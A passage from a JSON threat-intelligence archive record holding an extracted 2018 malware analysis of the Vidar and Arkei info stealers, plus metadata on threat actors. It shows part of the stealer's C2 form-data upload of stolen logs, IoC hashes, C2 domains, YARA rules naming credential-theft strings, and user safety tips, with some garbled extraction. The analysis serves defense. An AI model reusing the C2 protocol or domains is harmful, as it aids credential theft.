name=\"user\"\nadmin\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"cccount\"\n0\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"ccount\"\n0\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"fcount\"\n0\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"telegram\"\n0\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"ver\"\n4.1\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"logs\"; filename=\"COUNTRY_.zip\"\nContent-Type: zip\n\n### Features differences\n\n```\nWhen we dig into the different features, there is some config part on Vidar that is in fact just some placebo options. in an example, the Steam\nstealing feature is implemented in Arkei is not found in Vidar. This is also the same thing with Skype but in contrary 2FA stealing stuff is only on\nVidar (with what I have seen on samples in my possession).\n\n_Strings only present in Arkei and not in the Vidar that I analyzed_\n\n## Is Arkei still active and maintained?\n\nOn one of the selling page of this stealer, it‚Äôs still sold and continue to be updated. For example, it reveals that soon a final update on it will be\npushed (v10). So let‚Äôs see how this will turn.\n\n\n-----\n\n## The Vidar Cracked Version\n\nThere is also in the wild a cracked version that was already spotted by some people on twitter. This Vidar or ‚ÄúAnti-Vidar‚Äù as called in the source\ncode of the panel and It‚Äôs based on an early Vidar build (v2.3 it seems).\n\n**_Login_**\n\n[The login is identical to the Android Lokibot panel (thanks to @siri_urz). As always when confronted at this kind of stuff, the code never lies (or](https://twitter.com/siri_urz)\nit seems) for helping us to identify what is the real C2/Malware.\n\n**_Profile code_**\n\nThe profile is far more simple than the nowadays panels and samples, the default profile is hardcoded on the PHP file, and will get it if the\nvalue is 11.\n\n## IoCs\n\n**_SHA256 Hashes_**\n\n3A20466CC8C07638B8882CCC9B14C08F605F700F03D388CF85B2E76C51D64D65\n0E982A02D754588D4EE99F30084B886B665FF04A1460D45C4FD410B04B10A8AF\n2679FA8E9FD0C1F6F26527D53759BB596FDA43A741B4DFCC99A8C0907836A835\n9EC586B07961E0C93C830DD1C47598FE21277432F11809A4B73DF7370CDD2E29\n42C6950CA57D8805C217E3334158DAB4CC71A50C94D77F608B1C442BFD2B01CA\nD71F81EDF8AC04639D3B7C80AA178DF95C2CBFE73F81E931448A475FB771267A\nDAD5FCEAB002791DD6FD575782C173F1A39E0E7CE36E6DE1BAEFA95D0A8FB889\n66162E69CA30A75E0DD1A6FBB9028FCFBE67B4ADE8E844E7C9FF2DCB46D993D8\nEFF272B93FAA1C8C403EA579574F8675AB127C63ED21DB3900F8AB4FE4EC6DA9\nEDBAC320C42DE77C184D30A69E119D27AE3CA7D368F802D2F8F1DA3B8D01D6DD\nB1D5B79D13F95A516ABBCC486841C8659984E5135F1D9C74343DCCD4390C3475\n543AEE5A5435C77A8DE01433079F6381ADB4110F5EF4350E9A1A56B98FE40292\n\n\n-----\n\n65 5 0939 6 8 95 8 083 800 86 698 683 3 9\n47E89F2C76D018D4952D421C5F1D603716B10E1712266DA32F63082F042F9C46\n5D37323DA22C5414F6E03E06EFD184D7837D598C5E395E83C1BF248A7DE57155\n5C0AF9C605AFD72BEF7CE8184BCCC9578EDB3A17498ACEBB74D02EB4AF0A6D2E\n65287763245FDD8B56BB72298C78FEA62405BD35794A06AFBBE23CC5D38BE90A\n20E92C2BF75C473B745617932F8DC0F8051BFC2F91BB938B2CC1CD808EBBC675\nC752B68F3694B2FAAB117BCBA36C156514047B75151BBBFE62764C85CEF8ADE5\nAE2EBF5B5813F92B0F7D6FCBADFA6E340646E4A776163AE86905E735A4B895A0\n8F73E9C44C86D2BBADC545CED244F38472C5AACE0F75F57C8FC2398CE0A7F5A1\n\nthx [@benkow_ for the help to find some samples üôÇ](https://twitter.com/benkow_)\n\n**_Domains_**\n\nmalansio.com\nnasalietco.com\nbinacoirel.com\nnewagenias.com\nbokolavrstos.com\nnaicrose.com\nbenderio.com\ncool3dmods.com\n\n## MITRE ATT&CK\n\n Yara Rules\n\n**_Vidar_**\n```\nrule Vidar_Stealer : Vidar \n{\n  meta:\n    description = \"Yara rule for detecting Vidar stealer\"\n    author = \"Fumik0_\"\n  strings:\n    $mz = { 4D 5A }\n    $s1 = { 56 69 64 61 72 }\n    $s2 = { 31 42 45 46 30 41 35 37 42 45 31 31 30 46 44 34 36 37 41 }\n  condition:\n    $mz at 0 and ( (all of ($s*)) )\n}\nrule Vidar_Early : Vidar \n{\n  meta:\n    description = \"Yara rule for detecting Vidar stealer - Early versions\"\n    author = \"Fumik0_\"\n  strings:\n    $mz = { 4D 5A }\n    $s1 = { 56 69 64 61 72 }\n    $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 }\n  condition:\n     $mz at 0 and all of ($hx*) and not $s1\n}\nrule AntiVidar : Vidar \n{\n  meta:\n    description = \"Yara rule for detecting Anti Vidar - Vidar Cracked Version\"\n    author = \"Fumik0_\"\n  strings:\n    $mz = { 4D 5A }\n    $s1 = { 56 69 64 61 72 }\n    $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 }\n    $hx2 = { 78 61 6B 66 6F 72 2E 6E 65 74 00 }\n  condition:\n     $mz at 0 and all of ($hx*) and not $s1\n}\n\n```\n**_Arkei_**\n\n\n-----\n\n```\nrule Arkei : Arkei\n{\n   meta:\n     Author = \"Fumik0_\"\n     Description = \"Rule to detect Arkei\"\n     Date = \"2018/12/11\"\n   strings:\n     $mz = { 4D 5A }\n     $s1 = \"Arkei\" wide ascii\n     $s2 = \"/server/gate\" wide ascii\n     $s3 = \"/server/grubConfig\" wide ascii\n     $s4 = \"\\\\files\\\\\" wide ascii\n     $s5 = \"SQLite\" wide ascii\n     $x1 = \"/c taskkill /im\" wide ascii\n     $x2 = \"screenshot.jpg\" wide ascii\n     $x3 = \"files\\\\passwords.txt\" wide ascii\n     $x4 = \"http://ip-api.com/line/\" wide ascii\n     $x5 = \"[Hardware]\" wide ascii\n     $x6 = \"[Network]\" wide ascii\n     $x7 = \"[Processes]\" wide ascii\n     $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 }\n   condition:\n     $mz at 0 and\n     ( (all of ($s*)) or ((all of ($x*)) and not $hx1))\n}\n\n## Github\n\n Recommendations\n\n```\nThis is, as usual, the same thing that I said about my precedent blog post.\n\nAlways running stuff inside a VM, be sure to install a lot of stuff linked to the hypervisor (like Guest Addons tools) to trigger as much as\npossible all kind of possible Anti-VM detection and closing malware.\nWhen you have done with your activities stop the VM and restore it with a Specific clean snapshot.\nAvoid storing files at a pre-destined path (Desktop, Documents, Downloads), put at a place that is not common.\nDon‚Äôt be stupid to click on cracks on youtube, hack software for popular games, or ‚Äúwonderful‚Äù easy cash money (like Free Bitcoin\nProgram /facepalm).\nFlush your browser after each visit, never saved your passwords directly on your browser or using auto-fill features.\nDon‚Äôt use the same password for all your websites (use 2FA and it‚Äôs possible).\n\n## Conclusion\n\nThis analysis was a kind of a mystery game. It‚Äôs hard to understand if Vidar is an evolution of Arkei or a forked malware based on his code. As\nfar it seems this is currently an active one and growing up. A lot of updates are pushed on it regularly probably due because this is a young\n(forked/copycat) malware. With the fact, that this stealer was also using the skin theme of Android Lokibot (due to the cracked version), this\ncould really lose some minds for identifying what is the correct name of the C2, without any samples to analyze. For now, let‚Äôs see with the\ntime if we will more answers to put the puzzle together for this stealer. ¬Ø\\_(„ÉÑ)_/¬Ø\n\nOn my side, if I could sum up this year. I have done way more things than I could imagine because 2018 was a really ‚Äúreaaalllyyyy‚Äù thought\nyear, with a lot of problems and huge issues. Let‚Äôs see how this next year will be. But now, it‚Äôs time to rest and eat because there were so\nmany sleep hours destroy and skip meals this year for learning stuff.\n\nSpecial thanks to my buddies (they will know who they are), you are the best <3\n\n\n-----\n\n#HappyHunting\n#SeeYouIn2019\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-12-24 - Let‚Äôs dig into Vidar ‚Äì An Arkei Copycat-Forked Stealer (In-depth analysis).pdf"
    ],
    "report_names": [
        "2018-12-24 - Let‚Äôs dig into Vidar ‚Äì An Arkei Copycat-Forked Stealer (In-depth analysis).pdf"
    ],
    "threat_actors": [
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1876bdf9-2d7c-482c-85d4-df77aef4a8a9",
            "created_at": "2023-01-06T13:46:39.092404Z",
            "updated_at": "2025-03-27T02:00:02.994689Z",
            "deleted_at": null,
            "main_name": "APT-C-12",
            "aliases": [
                "Sapphire Mushroom",
                "Blue Mushroom",
                "NuclearCrisis"
            ],
            "source_name": "MISPGALAXY:APT-C-12",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535713,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1653700841,
    "ts_modification_date": 1653700841,
    "files": {
        "pdf": "https://archive.orkl.eu/fbea0a6c61d2d64221363688f74138efd59cea14.pdf",
        "text": "https://archive.orkl.eu/fbea0a6c61d2d64221363688f74138efd59cea14.txt",
        "img": "https://archive.orkl.eu/fbea0a6c61d2d64221363688f74138efd59cea14.jpg"
    }
}